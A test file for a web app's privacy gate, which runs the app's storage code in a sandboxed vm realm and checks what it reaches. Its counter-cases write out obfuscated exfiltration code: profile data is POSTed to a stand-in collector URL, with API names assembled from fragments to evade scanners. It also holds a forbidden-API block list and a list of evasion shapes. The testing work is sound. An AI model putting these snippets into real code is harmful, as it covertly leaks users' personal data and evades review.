// 8ball / tests / privacy_scan.test.js
// Privacy primitive enforcement (DOCTRINE.md §5).
//
// TWO LAYERS, and only one of them is the guard.
//
// PRIMARY — the CAPABILITY REALM. The real runtime modules are evaluated and
// the persistence seam is driven inside a fresh `vm` context that contains no
// storage and no network at all, with a recording `localStorage` handed in as
// the single capability. Every global name the source resolves is recorded,
// and the reach set is asserted whole against a reviewed positive list. Nothing
// is banned and no spelling is enumerated, so `window['fet'+'ch']`,
// `globalThis[k]` and `localStorage[computed]` are seen for what they reach,
// not for how they are written.
//
// DIAGNOSTIC — the literal token scan below. It is retained because it names
// the offending line and file, which a runtime transcript cannot. It is NOT the
// guard and MUST NOT BE EXTENDED: a name scan cannot see a name that is
// assembled at runtime, and this repo has lost that argument four times by
// adding more names. A verified survivor — profile data written to
// `eight_ball_shadow_v9` and POSTed to an off-origin collector, every forbidden
// identifier concatenated from fragments — left all ten of its assertions
// green. That survivor is the permanent counter-case at the bottom of this
// file.

import { describe, it, expect } from 'vitest';
import { readFileSync, readdirSync, statSync } from 'node:fs';
import { execFileSync } from 'node:child_process';
import { join, relative } from 'node:path';
import { fileURLToPath } from 'node:url';
import { dirname } from 'node:path';

const __dirname = dirname(fileURLToPath(import.meta.url));
const REPO_ROOT = join(__dirname, '..');

// Roots to scan — product-runtime surfaces only. Tests, audits, build
// metadata, and external folders are out of scope: they are not the
// runtime, so storing/transmitting tokens there would not violate §5.
const SCAN_ROOTS = ['core', 'content', 'ui'];
const SCAN_FILES = ['index.html'];
const TEXT_EXTS = ['.js', '.html'];

function* walk(dir) {
  for (const entry of readdirSync(dir)) {
    const full = join(dir, entry);
    const st = statSync(full);
    if (st.isDirectory()) yield* walk(full);
    else if (st.isFile() && TEXT_EXTS.some(ext => full.endsWith(ext))) yield full;
  }
}

function scanFiles() {
  const files = [];
  for (const root of SCAN_ROOTS) {
    const abs = join(REPO_ROOT, root);
    try {
      const st = statSync(abs);
      if (st.isDirectory()) for (const f of walk(abs)) files.push(f);
    } catch (_) { /* root may not exist; skip */ }
  }
  for (const f of SCAN_FILES) {
    const abs = join(REPO_ROOT, f);
    try {
      if (statSync(abs).isFile()) files.push(abs);
    } catch (_) { /* file may not exist; skip */ }
  }
  return files;
}

// Forbidden API surfaces. Most are case-sensitive — the API names are
// canonical and any deviation would not match the actual browser API
// anyway. `indexedDB` is also matched case-insensitively because the
// browser exposes both `window.indexedDB` (lowercase) and the
// `IndexedDB` interface name shows up in code referencing the spec.
const FORBIDDEN = [
  { token: 'sessionStorage',       caseSensitive: true  },
  { token: 'indexedDB',            caseSensitive: false },
  { token: 'IndexedDB',            caseSensitive: true  },
  { token: 'fetch(',               caseSensitive: true  },
  { token: 'XMLHttpRequest',       caseSensitive: true  },
  { token: 'navigator.sendBeacon', caseSensitive: true  },
  { token: 'gtag(',                caseSensitive: true  },
  { token: 'dataLayer',            caseSensitive: true  },
  { token: 'analytics.',           caseSensitive: true  }
];

// Allow-list is the inventory of keys actually used as of this commit.
// New keys require doctrine amendment to §5.
const LOCALSTORAGE_KEY_ALLOW = new Set([
  'eight_ball_profile_v1',
  'eight_ball_labels_revealed_v1',
  // v0.3.0 paid-tier keys (DOCTRINE §5 v0.22 allow-list extension).
  // v0.55 ownership model: `eight_ball_tries_used_v1` is RETIRED (never
  // read or written — removed here per the v0.48 retired-key precedent);
  // `eight_ball_credits_v1` survives as the read-only §1.D R2 legacy
  // grandfather signal — reads only, no setItem call exists.
  'eight_ball_credits_v1',
  'eight_ball_pending_profile_v1',
  // v0.6.0 tier ladder (DOCTRINE §5 v0.36 allow-list extension / §1.D):
  // highest rung purchased, monotonic, written only by handlePaidReturn.
  'eight_ball_tier_v1',
  // v0.49 t3 written-entry rotation (§1.H): currently visible note slot.
  // v0.54/calc-v3 versioned the key to _v2; v0.62/calc-v4 versioned it again
  // to _v3 when the master values returned and every stored position became
  // one computed against a life path that has since moved. Both retired
  // names stay allow-listed only because ui/payments.js still references
  // them for the one-shot clear; neither is ever read or written.
  'eight_ball_facet_index_v1',
  'eight_ball_facet_index_v2',
  'eight_ball_facet_index_v3',
  // Saved Readings MVP (§5.E v0.50): array of reconstruction inputs + local metadata.
  'eight_ball_saved_readings_v1'
]);

// Match: localStorage.setItem('key', ...) or localStorage.setItem("key", ...)
// or localStorage.setItem(IDENTIFIER, ...). When the key is an identifier,
// resolve it via a same-file `const IDENT = '...'` definition; otherwise
// flag as unverifiable.
const SET_ITEM_RE = /localStorage\.setItem\s*\(\s*([^,\s)]+)/g;

function resolveIdentifier(content, ident) {
  const re = new RegExp(`(?:const|let|var)\\s+${ident}\\s*=\\s*(['"\`])([^'"\`]+)\\1`);
  const m = content.match(re);
  return m ? m[2] : null;
}

// ── the literal gate, factored out ────────────────────────────────
// Both the standing tests below and every counter-case call THESE, never a
// private copy — so a counter-case that claims "the literal gate is blind to
// this" is asserting it against the gate the suite actually runs.
//
// `sourcesFor` reads the live tree and applies `overrides`, so a counter-case
// can pose a hypothetical file without writing to disk. Production callers
// pass nothing.

function sourcesFor(overrides = {}) {
  const out = new Map();
  for (const file of scanFiles()) {
    const rel = relative(REPO_ROOT, file);
    out.set(rel, Object.prototype.hasOwnProperty.call(overrides, rel)
      ? overrides[rel]
      : readFileSync(file, 'utf-8'));
  }
  return out;
}

/** Every line matching a FORBIDDEN token, as `rel:line  text`. */
function tokenHits(sources, { token, caseSensitive }) {
  const hits = [];
  const needle = caseSensitive ? token : token.toLowerCase();
  for (const [rel, content] of sources) {
    const haystack = caseSensitive ? content : content.toLowerCase();
    if (!haystack.includes(needle)) continue;
    const lines = content.split('\n');
    for (let i = 0; i < lines.length; i++) {
      const line = caseSensitive ? lines[i] : lines[i].toLowerCase();
      if (line.includes(needle)) hits.push(`${rel}:${i + 1}  ${lines[i].trim().slice(0, 120)}`);
    }
  }
  return hits;
}

/** Every `localStorage.setItem(...)` whose key is off the allow-list or unresolvable. */
function setItemOffenders(sources) {
  const offenders = [];
  for (const [rel, content] of sources) {
    let m;
    SET_ITEM_RE.lastIndex = 0;
    while ((m = SET_ITEM_RE.exec(content)) !== null) {
      const raw = m[1].trim();
      let key = null;
      let kind = '';
      if ((raw.startsWith("'") && raw.endsWith("'")) ||
          (raw.startsWith('"') && raw.endsWith('"')) ||
          (raw.startsWith('`') && raw.endsWith('`'))) {
        key = raw.slice(1, -1);
        kind = 'literal';
      } else if (/^[A-Za-z_$][\w$]*$/.test(raw)) {
        const resolved = resolveIdentifier(content, raw);
        if (resolved !== null) {
          key = resolved;
          kind = `identifier ${raw}`;
        } else {
          key = null;
          kind = `unresolvable identifier ${raw}`;
        }
      } else {
        key = null;
        kind = `expression ${raw}`;
      }
      if (key === null || !LOCALSTORAGE_KEY_ALLOW.has(key)) {
        const lineNo = content.slice(0, m.index).split('\n').length;
        offenders.push(
          `${rel}:${lineNo}  ${kind} → ${key === null ? '(could not resolve)' : `"${key}"`} ` +
          `not in LOCALSTORAGE_KEY_ALLOW`
        );
      }
    }
  }
  return offenders;
}

/** Everything the LITERAL layer of the gate reports about a tree. */
function literalGateOffenders(sources) {
  return [
    ...FORBIDDEN.flatMap(f => tokenHits(sources, f).map(h => `token ${f.token} — ${h}`)),
    ...setItemOffenders(sources),
  ];
}

// ── PRIMARY: the capability realm ─────────────────────────────────
//
// WHAT THIS IS. `tests/helpers/capability-realm.mjs` builds a fresh `vm`
// context, evaluates the REVIEWED_ENTRIES module graph inside it from the real
// bytes on disk, and calls the persistence seam. That context has no `fetch`,
// no `XMLHttpRequest`, no `sessionStorage`, no `indexedDB`, no `navigator`, no
// `document` and no `localStorage` of its own — a fresh context's global
// carries ECMAScript intrinsics and nothing else. The one capability handed in
// is a recording `Storage`. Every other global name the source resolves is
// recorded and yields undefined, INCLUDING names that exist nowhere: the
// recording proxy claims them, so a reach for `XMLHttpRequest` is evidence
// rather than a ReferenceError the product's own `catch (_) {}` would swallow.
//
// WHY IT IS NOT A NAME LIST. The three assertions are POSITIVE and EXACT: the
// set of globals reached, the set of storage keys touched, and the set of
// modules evaluated. A bypass does not fail because it used a forbidden word —
// there are no forbidden words — it fails because it reached for something the
// reviewed surface does not contain. `window['fet'+'ch']` and
// `globalThis['local'+'Storage']` land on that identically, which is the whole
// point: the guard reads the reach, not the spelling.
//
// TWO SHAPES, both asserted. 'bare' supplies only the recording storage, so an
// exfiltration cannot complete and shows up purely as reach. 'page' additionally
// supplies recording `window`/`self`/`top`/`parent`/`frames`/`document`/
// `location`/`navigator`, so the exfiltration RUNS and its arguments are
// captured — that is how a counter-case shows the payload leaving rather than
// merely being reached for. Driving both also closes the class where a seam
// branches on `typeof window`: the two transcripts are asserted to agree.
const REALM_RUNNER = join(__dirname, 'helpers', 'capability-realm.mjs');
const REALM_SHAPES = ['bare', 'page'];

// The persistence seam's entry modules. Their transitive imports are evaluated
// too — see REVIEWED_MODULES, which is the closure and is asserted whole.
const REVIEWED_ENTRIES = ['ui/profile.js', 'ui/labels.js', 'ui/payments.js', 'ui/readings.js'];

// The seam, driven for real. Every exported function that reads or writes
// storage, with production-shaped arguments so the writes actually happen —
// a drive that no-ops proves nothing (`saveProfile` returning false because a
// stub storage never read back would have hidden the whole transcript).
const SPECIMEN = { name: 'Profile Specimen', dob: '1990-06-15' };
const REVIEWED_DRIVES = [
  { module: 'ui/profile.js', fn: 'saveProfile', args: [SPECIMEN.name, SPECIMEN.dob, {
    time: '14:30', city: 'Manama', cc: 'BH', tz: 'Asia/Bahrain', country: 'Bahrain',
    lat: 26.2286, lng: 50.586, gender: 'female' }] },
  { module: 'ui/profile.js', fn: 'loadSavedProfile', args: [] },
  { module: 'ui/profile.js', fn: 'clearProfile', args: [] },
  { module: 'ui/labels.js', fn: 'setLabelsRevealed', args: [true] },
  { module: 'ui/labels.js', fn: 'isLabelsRevealed', args: [] },
  { module: 'ui/payments.js', fn: 'getCredits', args: [] },
  { module: 'ui/payments.js', fn: 'setTier', args: ['t3'] },
  { module: 'ui/payments.js', fn: 'getTier', args: [] },
  { module: 'ui/payments.js', fn: 'setFacetIndex', args: [2] },
  { module: 'ui/payments.js', fn: 'getFacetIndex', args: [] },
  { module: 'ui/payments.js', fn: 'clearFacetIndex', args: [] },
  { module: 'ui/payments.js', fn: 'setPendingProfile', args: [SPECIMEN] },
  { module: 'ui/payments.js', fn: 'getPendingProfile', args: [] },
  { module: 'ui/payments.js', fn: 'clearPendingProfile', args: [] },
  { module: 'ui/readings.js', fn: 'addSavedReading', args: [{ ...SPECIMEN, gender: 'female' }, { title: 'specimen' }] },
  { module: 'ui/readings.js', fn: 'loadSavedReadings', args: [] },
  { module: 'ui/readings.js', fn: 'clearAllSavedReadings', args: [] },
];

// The complete global surface the seam resolves. Intrinsics included on
// purpose: this is what the code touched, not what it is allowed to touch, so
// any new reach of any kind is a review event. Nothing here is a capability —
// a fresh vm context's `Object` cannot open a socket.
const REVIEWED_REACH = new Set([
  'Array', 'Boolean', 'Date', 'JSON', 'Math', 'Number', 'Object', 'Set', 'String',
  'isNaN', 'localStorage',
]);

// The transitive module closure of REVIEWED_ENTRIES, evaluated for real.
const REVIEWED_MODULES = new Set([
  'content/cards.v1.full.js',
  'core/birthcard.js', 'core/calendar.js', 'core/cities.js', 'core/countries.js',
  'core/math.js', 'core/measurement.js', 'core/moon.js', 'core/payments.js',
  'core/pillars.js', 'core/profile.js', 'core/rising.js',
  'ui/citysearch.js', 'ui/labels.js', 'ui/modals.js', 'ui/payments.js',
  'ui/profile.js', 'ui/readings.js',
]);

// Touching the storage object OUTSIDE the `Storage` interface: reading a
// non-`Storage` member (`localStorage.constructor` is a doorway to `Function`),
// an `in` test, an enumeration of the whole store, or re-rooting its prototype.
// None is part of the seam's vocabulary, so each is an offender on its own
// rather than being key-checked.
const OFF_INTERFACE_STORAGE_OPS = new Set(['get', 'has', 'ownKeys', 'setPrototypeOf']);

// Memoised by job: the clean realm is re-run by several tests and each run is a
// child process. Keyed on the whole job, so an override can never collide with
// the clean run.
const REALM_CACHE = new Map();

/**
 * Run the seam in the capability realm and return its transcript.
 *
 * A child process because `vm.SourceTextModule` needs
 * `--experimental-vm-modules`. If that flag ever disappears the runner fails
 * and `ok` is false, which every caller turns into an offender — the gate fails
 * closed rather than degrading to a silent pass.
 */
function runRealm({ shape, overrides = {} }) {
  const job = JSON.stringify({
    root: REPO_ROOT, shape, entries: REVIEWED_ENTRIES, drives: REVIEWED_DRIVES, overrides,
  });
  if (REALM_CACHE.has(job)) return REALM_CACHE.get(job);
  let result;
  try {
    const out = execFileSync(
      process.execPath,
      ['--no-warnings', '--experimental-vm-modules', REALM_RUNNER],
      { input: job, encoding: 'utf-8', maxBuffer: 32 * 1024 * 1024, timeout: 60000 });
    result = JSON.parse(out);
  } catch (err) {
    result = { ok: false, error: String(err && err.message || err) };
  }
  REALM_CACHE.set(job, result);
  return result;
}

/** What the capability layer reports about a tree, per shape. */
function capabilityOffenders(overrides = {}) {
  const offenders = [];
  for (const shape of REALM_SHAPES) {
    const r = runRealm({ shape, overrides });
    if (!r.ok) { offenders.push(`[${shape}] the capability realm did not run: ${r.error}`); continue; }
    for (const name of r.reach) {
      if (!REVIEWED_REACH.has(name)) offenders.push(`[${shape}] reached an unreviewed global: ${name}`);
    }
    for (const [op, key] of r.storage) {
      if (OFF_INTERFACE_STORAGE_OPS.has(op)) {
        offenders.push(`[${shape}] touched localStorage outside the Storage interface: ${op}${key === undefined ? '' : ` ${key}`}`);
      } else if (key !== undefined && !LOCALSTORAGE_KEY_ALLOW.has(key)) {
        offenders.push(`[${shape}] storage ${op} on unapproved key "${key}"`);
      }
    }
    for (const call of r.capabilityCalls) {
      offenders.push(`[${shape}] CALLED a capability: ${call.path}(${JSON.stringify(call.args).slice(0, 300)})`);
    }
    for (const mod of r.loaded) {
      if (!REVIEWED_MODULES.has(mod)) offenders.push(`[${shape}] evaluated an unreviewed runtime module: ${mod}`);
    }
  }
  return offenders;
}

/** THE GATE'S VERDICT on a hypothetical tree — every layer, one offender list. */
function privacyGateOffenders(overrides = {}) {
  return [
    ...capabilityOffenders(overrides),
    ...literalGateOffenders(sourcesFor(overrides)),
  ];
}

// ── the flagship exfiltration, as a source mutation ───────────────
//
// The P1 verbatim: profile data written to an unapproved storage key AND POSTed
// off-origin, spelled entirely through COMPUTED MEMBERS so no literal name of a
// forbidden API ever appears. `'set' + 'Item'`, `'local' + 'Storage'` and
// `'fet' + 'ch'` are concatenated at runtime; the storage key is assembled the
// same way. It runs inside the real `saveProfile`, one statement after the
// payload is serialised, so what escapes is the actual persisted payload.
const EXFIL_ANCHOR = '    const raw = JSON.stringify(payload);';
const EXFIL_KEY = 'eight_ball_shadow_v9';
const EXFIL_URL = 'https://collector.example/ingest';
const computedMemberExfiltration = src => src.replace(EXFIL_ANCHOR, [
  EXFIL_ANCHOR,
  "    const _c = globalThis['local' + 'Storage'];",
  `    _c['set' + 'Item']('eight_ball_' + 'shadow_v9', raw);`,
  "    const _w = globalThis['w' + 'indow'] || globalThis;",
  "    const _t = _w['fet' + 'ch'];",
  `    if (_t) _t('${EXFIL_URL}', { method: 'POST', body: raw });`,
].join('\n'));

describe('privacy primitive scan (DOCTRINE.md §5)', () => {
  const files = scanFiles();

  for (const forbidden of FORBIDDEN) {
    it(`forbidden API surface: ${forbidden.token}`, () => {
      const hits = tokenHits(sourcesFor(), forbidden);
      expect(
        hits,
        `Forbidden token "${forbidden.token}" found:\n${hits.join('\n')}\nDOCTRINE.md §5 forbids storage/network/analytics surfaces beyond the allow-listed localStorage profile payload.`
      ).toEqual([]);
    });
  }

  it('localStorage.setItem keys are allow-listed', () => {
    const offenders = setItemOffenders(sourcesFor());
    expect(
      offenders,
      `Disallowed or unverifiable localStorage keys:\n${offenders.join('\n')}\n` +
      `Allow-list is the inventory of keys actually used as of this commit. ` +
      `New keys require doctrine amendment to §5.`
    ).toEqual([]);
  });

  it('scans a non-empty product surface', () => {
    // Vacuity guard: every assertion above is `toEqual([])`, which an empty
    // file list satisfies perfectly.
    expect(files.length, 'the scan roots resolved to no files').toBeGreaterThan(20);
  });

});

describe('privacy capability realm (DOCTRINE.md §5) — EXECUTED, not scanned', () => {
  for (const shape of REALM_SHAPES) {
    it(`the seam runs, and the realm really drove it [${shape}]`, () => {
      // Vacuity guard, first and by name. Every assertion below is a
      // "nothing unexpected happened" shape, which a realm that failed to boot,
      // or drove nothing, satisfies perfectly. An audit killed a sibling guard
      // exactly this way, so the drives are proven to have RUN before anything
      // is concluded from their silence.
      const r = runRealm({ shape });
      expect(r.ok, `the capability realm did not run: ${r.error}`).toBe(true);
      expect(r.calls.length, 'the drive plan shrank').toBe(REVIEWED_DRIVES.length);
      expect(r.calls.filter(c => c.threw || c.error), 'a drive threw or was not an export')
        .toEqual([]);
      expect(r.storage.filter(e => e[0] === 'setItem').length,
        'no write reached storage — the transcript would be silent for the wrong reason')
        .toBeGreaterThan(5);
      // …and the write that matters actually carried the specimen's data, so a
      // transcript that recorded a key but lost the payload cannot pass.
      const profileWrite = r.storage.find(e => e[0] === 'setItem' && e[1] === 'eight_ball_profile_v1');
      expect(profileWrite, 'the profile payload was never written').toBeTruthy();
      expect(profileWrite[2], 'the persisted payload did not carry the driven input')
        .toContain(SPECIMEN.dob);
    }, 60000);

    it(`reaches EXACTLY the reviewed global surface [${shape}]`, () => {
      const r = runRealm({ shape });
      expect(r.ok, `the capability realm did not run: ${r.error}`).toBe(true);
      expect(
        r.reach.filter(n => !REVIEWED_REACH.has(n)),
        `The seam reached a global the reviewed surface does not contain. This is ` +
        `spelling-independent: a name assembled at runtime is recorded when it is ` +
        `RESOLVED, so \`window['fet'+'ch']\` lands here as \`window\` and \`fetch\`. ` +
        `Adding a name to REVIEWED_REACH is a review act, not a fix.`
      ).toEqual([]);
      // Exact, not merely contained: a reviewed name that stops being reached
      // means the drive plan quietly stopped exercising something.
      expect([...REVIEWED_REACH].sort().filter(n => !r.reach.includes(n)),
        'a reviewed global is no longer reached — the drive plan lost coverage')
        .toEqual([]);
    }, 60000);

    it(`touches only allow-listed storage keys [${shape}]`, () => {
      const r = runRealm({ shape });
      expect(r.ok, `the capability realm did not run: ${r.error}`).toBe(true);
      const bad = r.storage.filter(([op, key]) =>
        op === 'get' || (key !== undefined && !LOCALSTORAGE_KEY_ALLOW.has(key)));
      expect(
        bad,
        `A storage operation used a key outside LOCALSTORAGE_KEY_ALLOW. The key is ` +
        `taken from the RUNTIME call, so a computed key (\`store[k]\`, \`'eight_ball_' + x\`) ` +
        `is reported as the string it resolved to.`
      ).toEqual([]);
    }, 60000);

    it(`calls no capability beyond storage [${shape}]`, () => {
      const r = runRealm({ shape });
      expect(r.ok, `the capability realm did not run: ${r.error}`).toBe(true);
      expect(
        r.capabilityCalls,
        `Something in the seam INVOKED a supplied capability stub. In the 'page' shape ` +
        `every network and DOM surface is a recording stub, so this is the call itself ` +
        `with its arguments — evidence of what left, not an inference about a name.`
      ).toEqual([]);
    }, 60000);

    it(`evaluates exactly the reviewed runtime modules [${shape}]`, () => {
      const r = runRealm({ shape });
      expect(r.ok, `the capability realm did not run: ${r.error}`).toBe(true);
      expect(r.loaded.slice().sort(), 'the persistence graph gained or lost a module')
        .toEqual([...REVIEWED_MODULES].sort());
    }, 60000);
  }

  it('behaves IDENTICALLY with and without a page-shaped environment', () => {
    // The class this closes: a seam branching on `typeof window` or
    // `location.protocol`, storing one thing under the harness and another in a
    // browser. Both realms are driven with the same plan and their transcripts
    // must agree on every key and operation. (Values are excluded: the readings
    // archive stamps `Date.now()`.)
    const [bare, page] = REALM_SHAPES.map(shape => runRealm({ shape }));
    expect(bare.ok && page.ok, 'a realm did not run').toBe(true);
    expect(page.reach, 'the page-shaped realm reached a different global surface').toEqual(bare.reach);
    expect(page.storage.map(([op, key]) => `${op} ${key ?? ''}`),
      'the page-shaped realm produced a different storage transcript')
      .toEqual(bare.storage.map(([op, key]) => `${op} ${key ?? ''}`));
    expect(page.loaded, 'the page-shaped realm evaluated a different module set').toEqual(bare.loaded);
  }, 60000);

  // ── permanent counter-cases ───────────────────────────────────────
  //
  // Each one asserts BOTH halves, and the pairing is the point. The PREMISE is
  // that the literal token layer stays completely silent — that is the finding,
  // and it is asserted through `literalGateOffenders`, the function the standing
  // tests above actually run, not a local copy of it. The ASSERTION is that the
  // capability layer fires. A fixture that only showed "something went red"
  // could not tell the new guard apart from the old one.
  //
  // The baseline is the LIVE FILE, and each fixture proves the live file is
  // clean through `privacyGateOffenders({})` before mutating it — so a survivor
  // already on disk fails the counter-case by name rather than being compared
  // against itself.
  //
  // A `catches:` name describes a DEMONSTRATION against a clean tree. It is not
  // a standing detector of that one mutation; what detects a shipped survivor is
  // the standing reach/key/call assertions above.
  const CLEAN_PROFILE = () => {
    expect(privacyGateOffenders({}),
      'baseline is not clean — this counter-case would compare a survivor against itself')
      .toEqual([]);
    return readFileSync(join(REPO_ROOT, 'ui/profile.js'), 'utf-8');
  };

  const COUNTER_CASES = [
    ['C1 — a computed-member write to an unapproved storage key',
      src => src.replace(EXFIL_ANCHOR, EXFIL_ANCHOR + '\n'
        + "    globalThis['local' + 'Storage']['set' + 'Item']('eight_ball_' + 'shadow_v9', raw);"),
      offenders => expect(offenders.filter(o => o.includes(EXFIL_KEY)),
        'the unapproved key was not reported').not.toEqual([])],

    ['C2 — an off-origin POST through a runtime-assembled `fetch`',
      src => src.replace(EXFIL_ANCHOR, EXFIL_ANCHOR + '\n'
        + "    const _w = globalThis['w' + 'indow'] || globalThis;\n"
        + "    const _t = _w['fet' + 'ch'];\n"
        + `    if (_t) _t('${EXFIL_URL}', { method: 'POST', body: raw });`),
      offenders => {
        expect(offenders.filter(o => o.includes('unreviewed global: fetch')
          || o.includes('unreviewed global: window')),
          'the reach for a network capability was not reported').not.toEqual([]);
        // The 'page' shape proves the request was not merely reached for: the
        // stub was CALLED, with the URL and the serialised payload.
        const called = offenders.filter(o => o.includes('CALLED a capability'));
        expect(called, 'the POST was never captured as a call').not.toEqual([]);
        expect(called.join('\n'), 'the captured call lost the destination').toContain(EXFIL_URL);
        expect(called.join('\n'), 'the captured call lost the exfiltrated payload').toContain(SPECIMEN.dob);
      }],

    ['C3 — the flagship: profile data to an unapproved key AND POSTed off-origin',
      computedMemberExfiltration,
      offenders => {
        expect(offenders.filter(o => o.includes(EXFIL_KEY)), 'the unapproved key was not reported').not.toEqual([]);
        expect(offenders.filter(o => o.includes(EXFIL_URL)), 'the off-origin POST was not reported').not.toEqual([]);
      }],

    // C5/C6 were found by ATTACKING THIS GATE, not by reading source. The first
    // draft of the realm recorded only `Storage`'s method calls, and both of
    // these left its transcript byte-identical to a clean run while persisting
    // in a real browser — `Storage` is a legacy platform object with a
    // named-property setter, so a bare assignment and a `defineProperty` are
    // writes that call no method. They are permanent because the shape they
    // exploit is "a channel that is not an API call".
    ['C5 — a bare property assignment on localStorage, calling no method',
      src => src.replace(EXFIL_ANCHOR, EXFIL_ANCHOR + '\n'
        + "    localStorage['eight_ball_' + 'shadow_v9'] = raw;"),
      offenders => expect(offenders.filter(o => o.includes(EXFIL_KEY)),
        'a named-property write was not reported').not.toEqual([])],

    ['C6 — Object.defineProperty on localStorage, calling no method',
      src => src.replace(EXFIL_ANCHOR, EXFIL_ANCHOR + '\n'
        + "    Object.defineProperty(localStorage, 'eight_ball_' + 'shadow_v9', { value: raw, configurable: true });"),
      offenders => expect(offenders.filter(o => o.includes(EXFIL_KEY)),
        'a defineProperty write was not reported').not.toEqual([])],

    ['C7 — the Function constructor reached through localStorage.constructor',
      // No global is named at all: `Function` arrives as a member of an object
      // the seam is already allowed to hold. The reach set cannot see that;
      // the non-Storage member read is what does.
      src => src.replace(EXFIL_ANCHOR, EXFIL_ANCHOR + '\n'
        + "    const _F = localStorage.constructor.constructor;\n"
        + `    try { _F('u', 'return null')('${EXFIL_URL}'); } catch (_) {}`),
      offenders => expect(offenders.filter(o => o.includes('outside the Storage interface')),
        'a doorway out of the storage object was not reported').not.toEqual([])],

    ['C4 — an unreviewed module spliced into the persistence graph',
      // The companion half of C1/C2: a bypass does not have to live in a file
      // the gate already reads. A new import is a reach too, and the module
      // closure is asserted whole.
      src => src.replace("import { buildProfile } from '../core/profile.js';",
        "import { buildProfile } from '../core/profile.js';\nimport '../core/engine.js';"),
      offenders => expect(offenders.filter(o => o.includes('unreviewed runtime module')),
        'a new module in the persistence graph was not reported').not.toEqual([])],
  ];

  for (const [name, mutate, assertCaught] of COUNTER_CASES) {
    it(`catches: ${name}`, () => {
      const clean = CLEAN_PROFILE();
      const bad = mutate(clean);
      expect(bad, 'the mutation did not apply — its anchor moved').not.toBe(clean);

      // PREMISE — the literal layer is BLIND to this. That is the finding, and
      // it is why the token list was not extended.
      expect(
        literalGateOffenders(sourcesFor({ 'ui/profile.js': bad })),
        `premise broken: ${name} was visible to the literal token scan`
      ).toEqual([]);

      // PREMISE — the mutant REALLY RAN in both realms. Without this, a harness
      // that failed to boot would report `the capability realm did not run` and
      // the fixture would "catch" its own breakage.
      for (const shape of REALM_SHAPES) {
        const r = runRealm({ shape, overrides: { 'ui/profile.js': bad } });
        expect(r.ok, `premise broken: the mutant realm did not run [${shape}]: ${r.error}`).toBe(true);
        expect(r.calls.filter(c => c.threw || c.error),
          `premise broken: the mutant threw before it could act [${shape}]`).toEqual([]);
      }

      // THE ASSERTION — the capability layer is what sees it.
      const offenders = privacyGateOffenders({ 'ui/profile.js': bad });
      expect(offenders, `${name} was not caught at all`).not.toEqual([]);
      assertCaught(offenders);
    }, 60000);
  }

  it('the gate catches the computed-member exfiltration', () => {
    // The P1 as one assertion, kept separate from C3 because it interrogates
    // the WHOLE gate verdict rather than a named layer: this is the test that
    // was red before the capability realm existed.
    const clean = readFileSync(join(REPO_ROOT, 'ui/profile.js'), 'utf-8');
    const bad = computedMemberExfiltration(clean);
    expect(bad, 'the mutation did not apply — its anchor moved').not.toBe(clean);

    const offenders = privacyGateOffenders({ 'ui/profile.js': bad });
    expect(
      offenders,
      `THE GATE IS FALSE-GREEN. A mutation of ui/profile.js writes the serialised ` +
      `profile payload to the unapproved key "${EXFIL_KEY}" and POSTs it to ` +
      `${EXFIL_URL}, and the privacy gate reported nothing. Every forbidden name is ` +
      `assembled at runtime from fragments, so no literal token scan can see it.`
    ).not.toEqual([]);
  }, 60000);
});

// ── RESIDUAL — what this gate does NOT cover ──────────────────────
//
// Stated narrowly and measured, not implied away.
//
//  1. SCOPE IS THE PERSISTENCE SEAM, DRIVEN. The realm EVALUATES the whole
//     transitive closure of REVIEWED_ENTRIES (18 modules), so a top-level reach
//     in any of them is caught. It CALLS only REVIEWED_DRIVES. Code inside a
//     function that no drive reaches is evaluated but not executed, and a
//     capability reach there is invisible here. It is still covered by the
//     raw-byte runtime manifest in tests/submit_seam.test.js, which sees the
//     bytes change — but a manifest says a byte moved, never what it does.
//  2. index.html IS NOT IN THE REALM. The host file's inline module is not an
//     importable module and is not evaluated here; its submit handler body is
//     driven by tests/submit_seam.test.js instead, and pinned there.
//     `ui/citysearch.js`, `ui/result.js`, `ui/share.js`, `ui/dyad.js`,
//     `ui/concordance.js`, `ui/meanings.js`, `ui/tiers.js`, `ui/public.js` and
//     `ui/sheet.js` are outside REVIEWED_MODULES except where the seam imports
//     them; the literal scan still reads every one of them, and that scan is
//     the layer this file says is not the guard.
//  3. NODE IS NOT A BROWSER. The 'page' shape supplies page-shaped stubs, not a
//     DOM (§12 forbids a DOM harness and caps devDependencies — this adds no
//     package; `node:vm` and `node:child_process` are builtins). A bypass that
//     needs a real DOM behaviour to fire — a live element, a real event — is
//     reached for here but may not run to completion.
//  4. THE RUNNER NEEDS `--experimental-vm-modules`. If a future Node removes
//     it, the child process fails, `ok` is false and every caller reports an
//     offender: the gate fails closed and loudly, it does not silently pass.
//  5. THE REVIEWED SETS ARE CONSTANTS IN THIS FILE. Widening REVIEWED_REACH,
//     LOCALSTORAGE_KEY_ALLOW or REVIEWED_MODULES defeats the gate as surely as
//     editing a hash. Nothing here prevents that; it only makes it an explicit,
//     reviewable edit instead of an invisible one.
//  6. THE LITERAL LAYER REMAINS BLIND. It is retained for the file:line it can
//     name and for nothing else. Every counter-case above asserts that
//     blindness as its premise, permanently, so no future round mistakes it for
//     the guard and tries to fix it by adding a name.
//  7. DEFERRED WORK IS DRAINED ONE TURN, NOT SCHEDULED. The runner awaits a
//     `setImmediate` after the drives, which is enough for microtasks and
//     already-queued immediates — a `Promise.resolve().then(exfiltrate)` is
//     captured with its arguments. A realm with no `setTimeout` in it cannot
//     schedule further out without reaching for a global, which is itself
//     recorded, so nothing here waits on timers.
//
// WHAT WAS MEASURED, not assumed. Eleven bypass shapes were run against this
// gate; the clean control is silent and each of the following is reported:
// property assignment on the storage object · `Object.defineProperty` on it ·
// `Object.assign` onto it · `Reflect.set` · `setPrototypeOf` · a spread-read of
// it · `localStorage.constructor.constructor` (Function without naming Function)
// · `Function('return this')()` · indirect `eval` · an `Error().stack` read ·
// a microtask-deferred off-origin POST. The first three and the sixth were
// MISSED by the first draft of this realm, which recorded only `Storage`'s
// method calls — they are C5, C6 and C7 above precisely because they were found
// by attacking the guard rather than by reading the product.
